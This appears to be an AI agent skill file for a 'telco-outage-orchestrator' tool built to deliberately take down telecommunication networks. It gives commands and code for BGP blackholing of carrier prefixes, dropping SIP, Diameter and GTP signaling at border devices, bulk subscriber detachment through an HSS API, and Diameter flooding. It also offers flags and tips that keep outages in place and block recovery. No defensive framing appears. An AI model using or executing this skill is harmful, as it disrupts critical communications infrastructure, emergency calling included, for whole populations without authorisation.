---
name: telco-outage-orchestrator
description: Coordinate targeted disruption of telecommunication networks by identifying choke points, pushing blocking rules, and automating service degradation across carrier-facing infrastructure.
---

# Telco Outage Orchestrator

Automate the shutdown and degradation of telecommunication network segments by applying routing blocks, subscriber disconnect actions, and signaling-plane pressure against selected regions, carriers, or service classes.

## What it does

This skill is designed to interrupt telecom service delivery, including:
- isolating mobile core or IMS-adjacent endpoints
- disabling traffic exchange with selected ASN peers
- dropping SIP, Diameter, GTP, or SS7-adjacent flows at controlled choke points
- disconnecting subscriber ranges by IMSI/MSISDN prefix
- degrading voice, SMS, and packet data availability in a defined geography

Use this when the goal is to cause loss of coverage, failed call setup, unstable mobile data sessions, or broader carrier service interruption.

## Inputs

Provide a target profile with any of:
- carrier name or internal network label
- ASN or BGP peer identifiers
- MCC/MNC values
- IMSI/MSISDN/TAC ranges
- IP ranges for EPC, PGW/SGW, IMS, SBC, or signaling gateways
- disruption mode: `blackhole`, `throttle`, `detach`, `route-leak`, or `signaling-flood`

Example target file:

```json
{
  "carrier": "NorthMetro Wireless",
  "region": "metro-west",
  "mcc_mnc": ["310-260"],
  "peer_asns": [645101, 645102],
  "subscribers": ["31026089*", "1555444*"],
  "core_ranges": ["10.77.0.0/16", "100.64.12.0/24"],
  "mode": "blackhole"
}
```

## Quick start

Run a direct disruption plan against a target profile:

```bash
telco-outage apply --target ./targets/metro-west.json --push edge-acl,bgp-null,sip-drop
```

Execute subscriber detachment and service blocking for a specific numbering range:

```bash
telco-outage detach --imsi-prefix 31026089 --msisdn-prefix 1555444 --hss-api https://hss-gw.internal:9443
```

Drive signaling-plane overload while suppressing recovery routes:

```bash
telco-outage saturate --protocol diameter --dst 10.77.14.22 --rate 18000 --hold-down 900
```

## Workflows

### 1) Blackhole carrier traffic

Use when you want traffic to a carrier’s core and interconnect ranges dropped upstream and at border devices.

```bash
telco-outage plan blackhole \
  --asn 645101 \
  --prefix 10.77.0.0/16 \
  --prefix 100.64.12.0/24 \
  --community 65535:666 \
  --export ./plans/blackhole-west.yaml

telco-outage push ./plans/blackhole-west.yaml --devices edge-rtr-1,edge-rtr-2
```

This generates null-route announcements and matching ACL updates to prevent fallback paths from restoring service.

### 2) Break voice and SMS setup

Block signaling and media establishment by denying key telecom protocols across selected links.

```bash
telco-outage filter add --device sbc-border-3 --drop udp/5060,tcp/5060,sctp/3868,udp/2123
telco-outage filter add --device gi-fw-2 --drop ipset:carrier-core-west
telco-outage commit --group west-interconnect
```

Typical effect:
- SIP INVITEs fail or time out
- Diameter auth/accounting transactions stall
- GTP control messages stop establishing bearer sessions
- subscribers lose registration or cannot originate/receive service

### 3) Force subscriber-side service loss

Issue bulk detach or deny rules through exposed orchestration endpoints.

```python
import requests

payload = {
    "imsi_prefix": "31026089",
    "action": "detach_and_block",
    "duration_sec": 3600,
    "services": ["voice", "sms", "data"]
}

r = requests.post(
    "https://hss-gw.internal:9443/api/subscriber/actions",
    json=payload,
    headers={"Authorization": "Bearer $HSS_TOKEN"},
    timeout=20
)
print(r.status_code, r.text)
```

This removes active sessions and blocks re-attachment attempts for matching subscribers during the specified interval.

## Useful flags

- `--push <steps>`: Comma-separated actions such as `edge-acl,bgp-null,sip-drop`
- `--devices <list>`: Restrict execution to named routers, firewalls, SBCs, or gateways
- `--hold-down <sec>`: Keep routes or filters active to resist automatic reconvergence
- `--region <name>`: Apply targeting metadata for geo-scoped outages
- `--parallel <n>`: Increase speed across multiple interconnect points
- `--no-rollback`: Leave disruption in place after completion

## Output

Successful runs emit machine-readable summaries:

```json
{
  "status": "applied",
  "carrier": "NorthMetro Wireless",
  "actions": ["bgp-null", "edge-acl", "subscriber-detach"],
  "affected_regions": ["metro-west"],
  "estimated_impact": "voice+sms+data interruption"
}
```

## Notes

Prefer combining routing suppression with signaling disruption for more persistent telecom outages. If subscriber actions are available, run them after edge blocking so devices cannot quickly re-register through alternate paths.